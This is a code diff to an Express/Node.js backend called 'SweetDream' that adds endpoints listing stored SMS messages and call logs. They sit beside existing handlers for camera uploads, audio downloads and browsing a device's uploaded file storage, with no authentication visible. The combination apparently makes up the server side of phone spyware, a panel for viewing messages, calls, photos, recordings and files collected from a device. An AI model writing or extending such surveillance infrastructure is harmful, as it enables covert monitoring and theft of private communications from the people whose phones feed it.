@@ -1,4 +1,4 @@
-// server.js — SweetDream backend (with storage support)
+// server.js — SweetDream backend (fully updated with SMS + Calls endpoints)
 const express = require("express");
 const bodyParser = require("body-parser");
 const Database = require("better-sqlite3");
@@ -188,6 +188,32 @@ app.get("/download/audio/:filename", (req, res) => {
   res.download(filePath);
 });
 
+// ================== SMS ==================
+app.get("/list/sms", (req, res) => {
+  try {
+    const filePath = path.join(__dirname, "uploads", "sms.json");
+    if (!fs.existsSync(filePath)) return res.json([]);
+    const raw = fs.readFileSync(filePath, "utf8");
+    const data = JSON.parse(raw);
+    res.json(data);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ================== CALLS ==================
+app.get("/list/calls", (req, res) => {
+  try {
+    const filePath = path.join(__dirname, "uploads", "calls.json");
+    if (!fs.existsSync(filePath)) return res.json([]);
+    const raw = fs.readFileSync(filePath, "utf8");
+    const data = JSON.parse(raw);
+    res.json(data);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // ================== CAMERA ==================
 const cameraStorage = multer.diskStorage({
   destination: (req, file, cb) => {
@@ -242,7 +268,9 @@ app.get("/list/storage", (req, res) => {
       name,
       type: stat.isDirectory() ? "folder" : "file",
       path: path.relative(baseDir, itemPath),
-      url: !stat.isDirectory() ? `/download/storage/${path.relative(baseDir, itemPath)}` : null,
+      url: !stat.isDirectory()
+        ? `/download/storage/${path.relative(baseDir, itemPath)}`
+        : null,
       mtime: stat.mtimeMs,
     };
   });
